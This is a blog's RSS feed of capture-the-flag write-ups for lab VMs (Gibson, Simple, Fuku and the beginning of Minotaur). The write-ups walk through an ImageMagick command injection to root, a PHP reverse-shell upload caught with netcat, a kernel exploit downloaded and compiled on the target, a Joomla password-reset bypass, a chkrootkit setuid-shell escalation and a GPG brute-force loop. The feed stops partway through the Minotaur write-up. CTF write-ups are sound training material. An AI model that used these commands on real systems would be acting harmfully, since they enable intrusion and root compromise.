<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Writeups on rastamouse.me</title>
    <link>https://rastamouse.me/writeups/</link>
    <description>Recent content in Writeups on rastamouse.me</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 21 May 2016 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://rastamouse.me/writeups/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Gibson 0.2</title>
      <link>https://rastamouse.me/writeups/2016/gibson/</link>
      <pubDate>Sat, 21 May 2016 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/writeups/2016/gibson/</guid>
      <description>

&lt;h1 id=&#34;livestream:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;Livestream&lt;/h1&gt;

&lt;p&gt;&lt;iframe src=&#34;https://player.twitch.tv/?video=v67731859&#34; frameborder=&#34;0&#34; scrolling=&#34;no&#34; height=&#34;448&#34; width=&#34;735&#34;&gt;&lt;/iframe&gt;&lt;a href=&#34;https://www.twitch.tv/rastamaus?tt_medium=live_embed&amp;tt_content=text_link&#34; target=&#34;_blank&#34; style=&#34;padding:2px 0px 4px; display:block; width:345px; font-weight:normal; font-size:10px;text-decoration:underline;&#34;&gt;Watch live video from RastaMaus on www.twitch.tv&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;writeup:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;Writeup&lt;/h1&gt;

&lt;h2 id=&#34;nmap:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;nmap&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -n -p- -sV 192.168.56.102

22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;davinci:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;davinci&lt;/h2&gt;

&lt;p&gt;Opening the page in Iceweasel, we get a simple directory lising with &lt;code&gt;davinci.html&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;title&amp;gt;Gibson Mining Corporation&amp;lt;/title&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;!-- Damn it Margo! Stop setting your password to &amp;quot;god&amp;quot; --&amp;gt;
&amp;lt;!-- at least try and use a different one of the 4 most --&amp;gt;
&amp;lt;!-- common ones! (eugene) --&amp;gt;
&amp;lt;h1&amp;gt; The answer you seek will be found by brute force&amp;lt;/h1&amp;gt;
&amp;lt;/body&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;ssh:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;SSH&lt;/h2&gt;

&lt;p&gt;We can use &lt;code&gt;margo:god&lt;/code&gt; to establish an SSH session :)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# ssh margo@192.168.56.102

margo@192.168.56.102&#39;s password: 
Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic x86_64)

margo@gibson:~$ id
uid=1002(margo) gid=1002(margo) groups=1002(margo),27(sudo)

margo@gibson:~$ sudo -l
Matching Defaults entries for margo on gibson:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User margo may run the following commands on gibson:
    (ALL) NOPASSWD: /usr/bin/convert
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;image-tragick:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;Image Tragick&lt;/h2&gt;

&lt;p&gt;We&amp;rsquo;ll check the version first to make sure it is vulnerable.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;margo@gibson:~$ convert --version
Version: ImageMagick 6.7.7-10
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then we can exploit the vulnerability and execute &lt;code&gt;/bin/sh&lt;/code&gt; to get a root shell ^_^&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;margo@gibson:~$ sudo convert &#39;https://example.com&amp;quot;;/bin/sh&amp;quot;&#39; out.png
# id
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;where-art-thou-flag:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;Where art thou, flag?&lt;/h2&gt;

&lt;p&gt;There&amp;rsquo;s no flag in &lt;code&gt;/root&lt;/code&gt;, so it looks like we&amp;rsquo;ll have to look at little deeper.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# ps aux

libvirt+  1303  0.5  7.3 841876 111516 ?       Sl   22:33   0:21 /usr/bin/qemu-system-x86_64 -name ftpserv -S -machine pc-i440fx-trusty,accel=tcg,usb=off -m 2

# ifconfig
virbr0    Link encap:Ethernet  HWaddr fe:54:00:72:e2:fb  
          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:6 errors:0 dropped:0 overruns:0 frame:0
          TX packets:15 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:1271 (1.2 KB)  TX bytes:1889 (1.8 KB)

# netstat -antp

tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      1290/dnsmasq    
tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      1303/qemu-system-x8
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Something is running virtualised on &lt;code&gt;192.168.122.1&lt;/code&gt; and is binding a &lt;code&gt;VNC&lt;/code&gt; service onto the localhost.  We could setup an SSH forwarder back to our machine and use a VNC client to interact with the image.  But I figured I would just find the image, move it to my kali VM and interact with it forensically.&lt;/p&gt;

&lt;p&gt;We can see from the process list that the name of the image is &lt;code&gt;ftpserv&lt;/code&gt;, so we can just search based on that.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# find / -name ftpserv*

/var/lib/libvirt/images/ftpserv.img
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I copied it to the web root for easy downloading&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# cp /var/lib/libvirt/images/ftpserv.img /var/www/html
# chmod 666 /var/www/html/ftpserv.img

root@kali:~# wget http://192.168.56.102/ftpserv.img

root@kali:~# file ftpserv.img 
ftpserv.img: DOS/MBR boot sector, FREE-DOS Beta 0.9 MBR; partition 1 : ID=0xe, active, start-CHS (0x0,1,1), end-CHS (0xf,15,63), startsector 63, 1048257 sectors
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;sleuthing:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;Sleuthing&lt;/h2&gt;

&lt;p&gt;First, display the partition layout of the volume with &lt;code&gt;mmls&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# mmls ftpserv.img 
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000000062   0000000063   Unallocated
002:  000:000   0000000063   0001048319   0001048257   Win95 FAT16 (0x0e)
003:  -------   0001048320   0001048575   0000000256   Unallocated
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Take note of the &lt;code&gt;start offset&lt;/code&gt; for the &lt;code&gt;FAT16&lt;/code&gt; partition, which is &lt;code&gt;63&lt;/code&gt;.  Then list file and directory names in the disk image using &lt;code&gt;fls&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# fls -f fat16 -o 63 ftpserv.img 
r/r 3:	KFYLNN      (Volume Label Entry)
d/d 4:	DOS
r/r 5:	KERNEL.SYS
r/r 6:	AUTOEXEC.BAT
r/r 7:	COMMAND.COM
r/r 8:	FDCONFIG.SYS
r/r 9:	BOOTSECT.BIN
d/d 11:	net
d/d 12:	GARBAGE
r/r * 13:	_WSDPMI.SWP
v/v 16763907:	$MBR
v/v 16763908:	$FAT1
v/v 16763909:	$FAT2
d/d 16763910:	$OrphanFiles

root@kali:~# fls -f fat16 -o 63 ftpserv.img 12
r/r 845574:	jz_ug.ans
r/r * 845576:	cookies.txt^
r/r 845578:	adminspo.jpg
r/r 845580:	flag.img
r/r * 845582:	cookies.txt^
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looks like &lt;code&gt;flag.img&lt;/code&gt; is what we need - we can use &lt;code&gt;icat&lt;/code&gt; to extract it.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# icat -f fat16 -o 63 ftpserv.img 845580 &amp;gt; flag.img

root@kali:~# file flag.img 
flag.img: Linux rev 1.0 ext2 filesystem data, UUID=d59bdd40-ec37-4d24-a956-80f549846121
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You could continue using forensics here, but I was determined to &lt;code&gt;mount&lt;/code&gt; something today! :)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# mount -t ext2 flag.img /mnt/

root@kali:~# ls -la /mnt/

-rwxrwxr-x  1 root root 21358 Nov 16  2011 davinci
-rw-r--r--  1 root root 28030 Nov 16  2011 davinci.c
-rw-r--r--  1 root root   159 May  5 19:56 hint.txt
drwxr-xr-x  2 root root  1024 May  5 20:07 .trash

root@kali:~# ls -la /mnt/.trash/

---x------ 1 root root    469 May 14 14:18 flag.txt.gpg
-rw-r--r-- 1 root root 320130 Sep  7  2015 LeithCentralStation.jpg

root@kali:~# cat /mnt/hint.txt

http://www.imdb.com/title/tt0117951/ and
http://www.imdb.com/title/tt0113243/ have
someone in common... Can you remember his
original nom de plume in 1988...?
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we have a GPG-protected flag and a hint as to what the password could be.  I started looking at &lt;code&gt;Jonny Lee Miller&lt;/code&gt; and some associated nicknames/aliases etc.  Eventually I came up with &lt;code&gt;Sick Boy&lt;/code&gt; and &lt;code&gt;Zero Cool&lt;/code&gt;.  Neither of these worked vanilla, so I thought I&amp;rsquo;d use &lt;code&gt;john&lt;/code&gt; to create a wordlist.  I didn&amp;rsquo;t know off-hand of any tools that could bruteforce GPG, so I wrote a terrible bash wrapper for it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;for p in `cat words`
do
	gpg --output /root/flag --batch --passphrase &amp;quot;${p}&amp;quot; --decrypt /mnt/.trash/flag.txt.gpg

	if [ -a /root/flag ]
	then
		echo &#39;found&#39;
		exit
	fi
done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;None of the wordlists I was created worked, so &lt;code&gt;knigh-home&lt;/code&gt; dropped me a hint that it was in &lt;code&gt;leet speak&lt;/code&gt; and told me of a &lt;code&gt;leetify&lt;/code&gt; script that I should look for.  Googling for it brought me to an old &lt;a href=&#34;http://www.backtrack-linux.org/forums/showthread.php?t=19933&#34;&gt;post on the BackTrack forum&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;So I generated a new wordlist and ran my bruteforce again.  These still weren&amp;rsquo;t working and I was given a final hint to try &lt;code&gt;zerokool&lt;/code&gt; instead of &lt;code&gt;zerocool&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# ./leetify.pl &amp;lt; words &amp;gt; l33t

root@kali:~# ./gpg.sh 
[...snip...]
gpg: decryption failed: bad key
gpg: CAST5 encrypted data
gpg: encrypted with 1 passphrase
gpg: WARNING: message was not integrity protected
found

root@kali:~# ls -l

-rw-r--r-- 1 root root       862 May 22 10:34 flag

root@kali:~# cat flag
 _   _            _      _____ _             ____  _                  _   _
| | | | __ _  ___| | __ |_   _| |__   ___   |  _ \| | __ _ _ __   ___| |_| |
| |_| |/ _` |/ __| |/ /   | | | &#39;_ \ / _ \  | |_) | |/ _` | &#39;_ \ / _ \ __| |
|  _  | (_| | (__|   &amp;lt;    | | | | | |  __/  |  __/| | (_| | | | |  __/ |_|_|
|_| |_|\__,_|\___|_|\_\   |_| |_| |_|\___|  |_|   |_|\__,_|_| |_|\___|\__(_)


Should you not be standing in a 360 degree rotating payphone when reading
this flag...? B-)

Anyhow, congratulations once more on rooting this VM. This time things were
a bit esoteric, but I hope you enjoyed it all the same.

Shout-outs again to #vulnhub for hosting a great learning tool. A special
thanks goes to g0blin and GKNSB for testing, and to g0tM1lk for the offer
to host the CTF once more.
                                                              --Knightmare
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;shout-outs:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;Shout outs&lt;/h2&gt;

&lt;p&gt;Thanks &lt;code&gt;knightmare&lt;/code&gt; for the VM and the continued hints throughout the livestream :)&lt;/p&gt;

&lt;p&gt;Thanks to everyone who stopped by for the livestream and particularly to those who posted in Twitch chat and the IRC channel.  Honourable mentions go to &lt;code&gt;rfc&lt;/code&gt;, &lt;code&gt;dqi&lt;/code&gt; and &lt;code&gt;superkojiman&lt;/code&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>BNE0x03 - Simple</title>
      <link>https://rastamouse.me/writeups/2016/simple/</link>
      <pubDate>Sat, 16 Apr 2016 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/writeups/2016/simple/</guid>
      <description>

&lt;h3 id=&#34;simple-ctf:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Simple CTF&lt;/h3&gt;

&lt;p&gt;Simple CTF is a boot2root that focuses on the basics of web based hacking.  /root/flag.txt is your ultimate goal.&lt;/p&gt;

&lt;h3 id=&#34;hints:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Hints&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Get a user shell by uploading a reverse shell and executing it.&lt;/li&gt;
&lt;li&gt;A proxy may help you to upload the file you want, rather than the file that the server expects.&lt;/li&gt;
&lt;li&gt;There are 3 known privesc exploits that work. Some people have had trouble executing one of them unless it was over a reverse shell using a netcat listener.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;discovery:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Discovery&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -p- -A 192.168.56.104

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Please Login / CuteNews
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;shell:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Shell&lt;/h2&gt;

&lt;p&gt;CuteNews 2.0.3 has an arbitary file upload vulnerability, in the avatar function of a registered user.  I first registered an account as &lt;code&gt;rasta:mouse&lt;/code&gt; and logged in.  Navigate to &lt;code&gt;Personal options&lt;/code&gt; and select the &lt;code&gt;Browse&lt;/code&gt; button to upload an avatar.&lt;/p&gt;

&lt;p&gt;I copied &lt;code&gt;/usr/share/webshells\php\php-reverse-shell.php&lt;/code&gt; to &lt;code&gt;/root/rasta.jpg&lt;/code&gt;, and changed the IP address for the callback.&lt;/p&gt;

&lt;p&gt;Before the upload, open &lt;code&gt;burp&lt;/code&gt; and turn &lt;code&gt;intercept&lt;/code&gt; on.  When you upload your file, use &lt;code&gt;burp&lt;/code&gt; to change the extension of the filename to &lt;code&gt;php&lt;/code&gt;.  So it looks something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;name=&amp;quot;avatar_file&amp;quot;; filename=&amp;quot;rasta.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once the file has been uploaded, create a &lt;code&gt;netcat&lt;/code&gt; listener and execute your shell.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc -lnvp 1234
listening on [any] 1234 ...

root@kali:~# curl http://192.168.56.104/uploads/avatar_rasta_rasta.php

connect to [192.168.56.102] from (UNKNOWN) [192.168.56.104] 52214
Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux
 08:01:39 up 37 min,  0 users,  load average: 0.00, 0.01, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can&#39;t access tty; job control turned off
$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;priv-esc:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Priv esc&lt;/h2&gt;

&lt;p&gt;This VM is running Ubuntu 14.04.1, which has a kernel vulnerability that will take us straight to &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ uname -a
Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I used &lt;code&gt;python -m SimpleHTTPServer&lt;/code&gt; on my Kali box and used &lt;code&gt;wget&lt;/code&gt; to download the exploit source code.  &lt;code&gt;gcc&lt;/code&gt; is installed on the VM, so we can compile and run without issue.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ wget http://192.168.56.102:8000/x.c
$ ls -l
-rw-rw-rw- 1 www-data www-data 5123 Apr 16 06:20 x.c
$ gcc x.c -o x
$ ./x
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can&#39;t access tty; job control turned off
# whoami
root
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;flag:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Flag&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# cat /root/flag.txt
U wyn teh Interwebs!!1eleven11!!1!
Hack the planet!
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>BNE0x02 - Fuku</title>
      <link>https://rastamouse.me/writeups/2016/fuku/</link>
      <pubDate>Fri, 15 Apr 2016 19:14:56 +0100</pubDate>
      
      <guid>https://rastamouse.me/writeups/2016/fuku/</guid>
      <description>

&lt;h3 id=&#34;fuku-ctf:4620d038ef80856257f87c289da6c889&#34;&gt;Fuku CTF&lt;/h3&gt;

&lt;p&gt;Fuku (pronounced &amp;ldquo;far queue&amp;rdquo;) CTF is designed to fuck with people.&lt;/p&gt;

&lt;p&gt;There are a few flag.txt files to grab. The final one is in the /root/ directory. However, the ultimate goal is to get a root shell.&lt;/p&gt;

&lt;h3 id=&#34;scenario:4620d038ef80856257f87c289da6c889&#34;&gt;Scenario&lt;/h3&gt;

&lt;p&gt;&amp;ldquo;Bull was pissed when you broke into his Minotaur box. He has taken precautions with another website that he is hosting, implementing IDS, whitelisting, and obfuscation techniques. He is now taunting hackers to try and hack him, believing himself to be safe. It is up to you to put him in his place.&amp;rdquo;&lt;/p&gt;

&lt;h3 id=&#34;hints:4620d038ef80856257f87c289da6c889&#34;&gt;Hints&lt;/h3&gt;

&lt;p&gt;Some scripting will probably be needed to find a useful port.
If the machine seems to go down after a while, it probably hasn&amp;rsquo;t. This CTF isn&amp;rsquo;t called Fuku for nothing!&lt;/p&gt;

&lt;p&gt;This VM was supremely fuckin annoying, as its IP address changes at regular intervals :)&lt;/p&gt;

&lt;p&gt;We first find it at &lt;code&gt;192.168.56.102&lt;/code&gt;.  So let&amp;rsquo;s port scan it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -p- 192.168.56.102
1/tcp     open  tcpmux
2/tcp     open  compressnet
3/tcp     open  compressnet
4/tcp     open  unknown
5/tcp     open  unknown
6/tcp     open  unknown
7/tcp     open  echo
8/tcp     open  unknown
9/tcp     open  discard
10/tcp    open  unknown
[...snip...]
65526/tcp open  unknown
65527/tcp open  unknown
65528/tcp open  unknown
65529/tcp open  unknown
65530/tcp open  unknown
65531/tcp open  unknown
65532/tcp open  unknown
65533/tcp open  unknown
65534/tcp open  unknown
65535/tcp open  unknown
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Every mother-humping port appears open!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc 192.168.56.102 80
HTTP/1.0 200 OK
Server: Apache/2.4.0 (Ubuntu)

&amp;lt;html&amp;gt;
&amp;lt;body&amp;gt;
FUKU!&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;

root@kali:~# nc 192.168.56.102 8080
HTTP/1.0 200 OK
Server: Apache/2.4.2 (Ubuntu)

&amp;lt;html&amp;gt;
&amp;lt;body&amp;gt;
FUKU!&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;

root@kali:~# nc 192.168.56.102 1234
HTTP/1.0 200 OK
Server: Apache/2.4.0 (Ubuntu)

&amp;lt;html&amp;gt;
&amp;lt;body&amp;gt;
FUKU!&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I suspect this may be some &lt;code&gt;iptables&lt;/code&gt; magic, where it redirects every port to one on which Apache is listening.  I manually checked a few common ports to see if anything was hidding, all I found was &lt;code&gt;22&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc 192.168.56.102 22
SSH-2.0-OpenSSH_6.7p1 Ubuntu-5ubuntu1

Protocol mismatch.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I figured the easiest way to find something different between the ports, was to fetch the content of each one and compare the data sizes or something.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash

for i in {1..65535}; do

	wget 192.168.56.131:$i -q -O $i -t 1 &amp;amp;

done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Be warned - this pretty much bricked my laptop :D and obviously half way through the scan the IP address changed!!!  Eventually, I got some results.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/fuku# ls -lS | head
total 256612
-rw-r--r-- 1 root root 14179 Apr 15 20:06 13370
-rw-r--r-- 1 root root    58 Apr 15 20:06 22
-rw-r--r-- 1 root root    37 Apr 15 20:06 1
-rw-r--r-- 1 root root    37 Apr 15 20:06 10
-rw-r--r-- 1 root root    37 Apr 15 20:06 100
-rw-r--r-- 1 root root    37 Apr 15 20:06 10000
-rw-r--r-- 1 root root    37 Apr 15 20:06 10001
-rw-r--r-- 1 root root    37 Apr 15 20:06 10002
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Reading the dump for port &lt;code&gt;13370&lt;/code&gt;, we can see this is an installation of Jooma.  We can hop over in a browser for confirmation, and we see a lovely Japanese Rick Roll rendition.&lt;/p&gt;

&lt;h2 id=&#34;joomla:4620d038ef80856257f87c289da6c889&#34;&gt;Joomla&lt;/h2&gt;

&lt;p&gt;The version of Joomla installed is &lt;code&gt;1.5.0&lt;/code&gt;, which has a remote admin password change vulnerability.  So we can navigate to &lt;code&gt;/index.php?option=com_user&amp;amp;view=reset&amp;amp;layout=confirm&lt;/code&gt;, pop a &lt;code&gt;&#39;&lt;/code&gt; in the text box and we&amp;rsquo;re free to set any new password we wish.&lt;/p&gt;

&lt;p&gt;We can then navigate to &lt;code&gt;/administrator&lt;/code&gt; and log in with our new creds; then get a PHP shell by uploading a backdoor into the template source code and requesting the page.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/fuku/joomla-admin.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;I just used &lt;code&gt;/usr/share/webshells/php/php-reverse-shell.php&lt;/code&gt; for this.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/fuku# nc -lnvp 1234
listening on [any] 1234 ...
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.124] 40273
haha! FUKU! Only root can run that command.
 05:38:31 up  1:14,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
haha! FUKU! Only root can run that command.
/bin/sh: 0: can&#39;t access tty; job control turned off
$ id
haha! FUKU! Only root can run that command.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It seems there&amp;rsquo;s some limitation going on with what commands we can run, which might get interesting.&lt;/p&gt;

&lt;h2 id=&#34;flag-1:4620d038ef80856257f87c289da6c889&#34;&gt;Flag 1&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ cat /var/www/html/flag.txt
Did you find this flag by guessing? Or possibly by looking in the robots.txt file?
Maybe you found it after getting a shell, by using a command like &amp;quot;find / -name flag.txt&amp;quot; ?
Random keyboard smash: J7&amp;amp;fVbh2kTy[JgS&amp;quot;98$vF4#;&amp;gt;mGcT
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;priv-esc:4620d038ef80856257f87c289da6c889&#34;&gt;Priv Esc&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ps aux
root      1442  0.0  0.5   5732  2744 ?        S    04:24   0:00 /bin/bash /root/chkrootkit-0.49/run_chkrootkit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After a quick Google, we learn that there&amp;rsquo;s a pretty dumb vulnerability in this version of &lt;code&gt;chkrootkit&lt;/code&gt;.  It will basically execute &lt;code&gt;/tmp/update&lt;/code&gt; as &lt;code&gt;root&lt;/code&gt;.  All we must do is place a script/binary there.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ echo &amp;quot;#!/bin/sh&amp;quot;&amp;gt;&amp;gt;update
$ echo &amp;quot;cp /bin/sh /tmp/sh&amp;quot;&amp;gt;&amp;gt;update
$ echo &amp;quot;chmod 7777 /tmp/sh&amp;quot;&amp;gt;&amp;gt;update
$ chmod +x update
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A few minutes later&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-rwsrwsrwt 1 root     root     112204 Apr 16 06:04 sh

$ ./sh
cd /root
ls -l

-rw------- 1 root root       122 Jan  1  1970 flag.txt

cat flag.txt
Yep, this is a flag. It&#39;s worth over 9000 Internet points!
Random keyboard smash: lkhI6u%RdFEtDjJKIuuiI7i&amp;amp;*iuGf)8$d4gfh%4
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>BNE0x00 - Minotaur</title>
      <link>https://rastamouse.me/writeups/2016/minotaur/</link>
      <pubDate>Fri, 15 Apr 2016 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/writeups/2016/minotaur/</guid>
      <description>

&lt;h3 id=&#34;minotaur-ctf:130852a9ee39e601e939903b24e77be6&#34;&gt;Minotaur CTF&lt;/h3&gt;

&lt;p&gt;Minotaur is a boot2root CTF. There are a few flag.txt files around to grab. /root/flag.txt is your ultimate goal.&lt;/p&gt;

&lt;h3 id=&#34;hints:130852a9ee39e601e939903b24e77be6&#34;&gt;Hints&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;This CTF has a couple of fairly heavy password cracking challenges, and some red herrings.&lt;/li&gt;
&lt;li&gt;One password you will need is not on rockyou.txt or any other wordlist you may have out there. So you need to think of a way to generate it yourself.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;enumeration:130852a9ee39e601e939903b24e77be6&#34;&gt;Enumeration&lt;/h2&gt;

&lt;p&gt;After spinning up the VM and doing an ARP scan, we find it at &lt;code&gt;192.168.56.223&lt;/code&gt;.  A port scan shows 3 ports available:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 ed:74:0c:c9:21:c4:58:47:d4:02:89:c7:e5:3e:09:18 (DSA)
|   2048 0c:4b:a8:24:7e:fc:cd:8a:b1:9f:87:dd:9d:06:30:05 (RSA)
|_  256 40:9b:fe:f9:82:41:17:93:a2:96:34:25:1c:53:bb:ae (ECDSA)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2020/tcp open  ftp     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There doesn&amp;rsquo;t appear to be anything within the FTP share, so let&amp;rsquo;s enumerate Apache a bit more.  There don&amp;rsquo;t appear to be any custom comments/changes to the default page, so directory scanning is a next logical step.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --sc 200 http://192.168.56.223/FUZZ/
********************************************************
* Wfuzz 2.1.3 - The Web Bruteforcer                      *
********************************************************

Target: http://192.168.56.223/FUZZ/
Total requests: 3036

==================================================================
ID	Response   Lines      Word         Chars          Request    
==================================================================

